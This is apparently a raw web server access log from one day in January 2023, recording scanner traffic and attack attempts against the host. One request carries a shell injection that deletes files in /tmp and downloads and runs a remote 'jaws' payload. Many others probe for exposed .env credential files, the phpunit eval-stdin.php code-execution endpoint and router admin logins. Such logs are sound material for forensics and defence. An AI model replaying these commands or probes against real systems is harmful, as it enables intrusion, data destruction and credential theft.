143.110.222.166 - - [29/Jan/2023:04:06:10 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.142.236.40 - - [29/Jan/2023:04:45:25 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
185.142.236.40 - - [29/Jan/2023:04:45:26 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "-"
185.142.236.40 - - [29/Jan/2023:04:45:28 -0600] "GET /sitemap.xml HTTP/1.1" 301 252 "-" "-"
185.142.236.40 - - [29/Jan/2023:04:45:28 -0600] "GET /.well-known/security.txt HTTP/1.1" 301 265 "-" "-"
185.142.236.40 - - [29/Jan/2023:04:45:30 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
143.110.222.166 - - [29/Jan/2023:05:05:37 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.177.242 - - [29/Jan/2023:05:07:55 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
185.73.124.50 - - [29/Jan/2023:05:58:36 -0600] "\x03" 400 226 "-" "-"
23.251.102.74 - - [29/Jan/2023:06:03:58 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
143.110.222.166 - - [29/Jan/2023:06:07:39 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
87.236.176.122 - - [29/Jan/2023:06:13:54 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
174.138.61.44 - - [29/Jan/2023:06:44:56 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
193.35.18.206 - - [29/Jan/2023:06:54:29 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [29/Jan/2023:07:10:10 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
193.35.18.231 - - [29/Jan/2023:07:10:52 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
81.161.229.94 - - [29/Jan/2023:07:49:19 -0600] "GET /config/getuser?index=0 HTTP/1.1" 301 263 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
143.110.222.166 - - [29/Jan/2023:08:07:23 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
128.14.209.170 - - [29/Jan/2023:08:08:57 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
183.245.24.119 - - [29/Jan/2023:08:09:37 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+137.175.17.190/jaws;sh+/tmp/jaws HTTP/1.1" 301 301 "-" "Hello, world"
169.150.196.210 - - [29/Jan/2023:08:17:44 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
184.105.247.196 - - [29/Jan/2023:08:22:47 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0"
184.105.247.196 - - [29/Jan/2023:08:24:27 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0"
184.105.247.196 - - [29/Jan/2023:08:24:57 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.104.11.51 - - [29/Jan/2023:08:33:58 -0600] "\x16\x03\x01" 400 226 "-" "-"
167.248.133.45 - - [29/Jan/2023:08:40:30 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
167.248.133.45 - - [29/Jan/2023:08:40:30 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.45 - - [29/Jan/2023:08:40:30 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
46.19.136.74 - - [29/Jan/2023:09:03:11 -0600] "GET /config.json HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36"
46.19.136.74 - - [29/Jan/2023:09:03:12 -0600] "GET /config.json HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36"
143.110.222.166 - - [29/Jan/2023:09:06:24 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.118.39.82 - - [29/Jan/2023:09:12:16 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
193.32.162.159 - - [29/Jan/2023:09:27:27 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
167.99.54.31 - - [29/Jan/2023:09:37:20 -0600] "GET /wp-login.php HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
54.214.223.93 - - [29/Jan/2023:09:39:06 -0600] "GET / HTTP/1.1" 301 241 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:07 -0600] "GET /.env HTTP/1.1" 301 245 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:07 -0600] "GET /.remote HTTP/1.1" 301 248 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:07 -0600] "GET /.local HTTP/1.1" 301 247 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:07 -0600] "GET /.production HTTP/1.1" 301 252 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:07 -0600] "GET //vendor/.env HTTP/1.1" 301 252 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:07 -0600] "GET //lib/.env HTTP/1.1" 301 249 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:07 -0600] "GET //lab/.env HTTP/1.1" 301 249 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:07 -0600] "GET //cronlab/.env HTTP/1.1" 301 253 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:08 -0600] "GET //cron/.env HTTP/1.1" 301 250 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:08 -0600] "GET //core/.env HTTP/1.1" 301 250 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:08 -0600] "GET //core/app/.env HTTP/1.1" 301 254 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:08 -0600] "GET //core/Datavase/.env HTTP/1.1" 301 259 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:08 -0600] "GET //database/.env HTTP/1.1" 301 254 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:08 -0600] "GET //config/.env HTTP/1.1" 301 252 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:08 -0600] "GET //assets/.env HTTP/1.1" 301 252 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:08 -0600] "GET //app/.env HTTP/1.1" 301 249 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:08 -0600] "GET //apps/.env HTTP/1.1" 301 250 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:08 -0600] "GET //uploads/.env HTTP/1.1" 301 253 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:09 -0600] "GET //sitemaps/.env HTTP/1.1" 301 254 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:09 -0600] "GET //saas/.env HTTP/1.1" 301 250 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:09 -0600] "GET //api/.env HTTP/1.1" 301 249 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:09 -0600] "GET //psnlink/.env HTTP/1.1" 301 253 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:09 -0600] "GET //exapi/.env HTTP/1.1" 301 251 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:09 -0600] "GET //site/.env HTTP/1.1" 301 250 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:09 -0600] "GET //admin/.env HTTP/1.1" 301 251 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:09 -0600] "GET //web/.env HTTP/1.1" 301 249 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:09 -0600] "GET //public/.env HTTP/1.1" 301 252 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:09 -0600] "GET //en/.env HTTP/1.1" 301 248 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:09 -0600] "GET //tools/.env HTTP/1.1" 301 251 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:10 -0600] "GET //v1/.env HTTP/1.1" 301 248 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:10 -0600] "GET //v2/.env HTTP/1.1" 301 248 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:10 -0600] "GET //administrator/.env HTTP/1.1" 301 259 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:10 -0600] "GET //laravel/.env HTTP/1.1" 301 253 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:10 -0600] "POST / HTTP/1.1" 301 241 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:10 -0600] "POST //admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 297 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:11 -0600] "POST //api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 295 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:11 -0600] "POST //backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 298 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:11 -0600] "POST //blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 296 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:11 -0600] "POST //cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 295 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:11 -0600] "POST //demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 296 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:11 -0600] "POST //dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 295 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:11 -0600] "POST //laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 299 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:11 -0600] "POST //lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 301 276 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:11 -0600] "POST //lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 301 284 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:11 -0600] "POST //lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 288 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:11 -0600] "POST //lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 280 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:11 -0600] "POST //new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 295 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:11 -0600] "POST //old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 295 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:12 -0600] "POST //panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 297 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:12 -0600] "POST //phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 301 272 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:12 -0600] "POST //phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 301 280 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:12 -0600] "POST //phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 284 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:12 -0600] "POST //phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 276 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:12 -0600] "POST //protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 301 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:12 -0600] "POST //sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 321 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:12 -0600] "POST //vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 301 279 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:12 -0600] "POST //vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 301 287 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:12 -0600] "POST //vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 291 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:12 -0600] "POST //vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 283 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:12 -0600] "POST //wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 321 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:12 -0600] "POST //wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 339 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:13 -0600] "POST //wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 326 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:13 -0600] "POST //wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 332 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
54.214.223.93 - - [29/Jan/2023:09:39:13 -0600] "POST //www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 295 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) AppleWebKit/536.6 (KHTML, like Gecko) Version/6.1.4 Safari/535.33"
179.43.177.242 - - [29/Jan/2023:09:49:42 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [29/Jan/2023:10:11:08 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
167.248.133.120 - - [29/Jan/2023:10:27:07 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
167.248.133.120 - - [29/Jan/2023:10:27:07 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.120 - - [29/Jan/2023:10:27:08 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
122.194.13.141 - - [29/Jan/2023:10:30:54 -0600] "POST /HNAP1/ HTTP/1.0" 400 600 "-" "-"
128.1.134.26 - - [29/Jan/2023:10:36:05 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
51.255.62.12 - - [29/Jan/2023:10:47:46 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
2620:96:e000:b0cc:e:2:1:2 - - [29/Jan/2023:10:59:30 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
2620:96:e000:b0cc:e:2:1:2 - - [29/Jan/2023:10:59:30 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
143.110.222.166 - - [29/Jan/2023:11:11:03 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.177.242 - - [29/Jan/2023:11:46:22 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
107.170.225.6 - - [29/Jan/2023:12:08:21 -0600] "MGLNDD_194.195.210.97_80\n" 400 226 "-" "-"
143.110.222.166 - - [29/Jan/2023:12:11:00 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
85.254.75.223 - - [29/Jan/2023:12:26:47 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
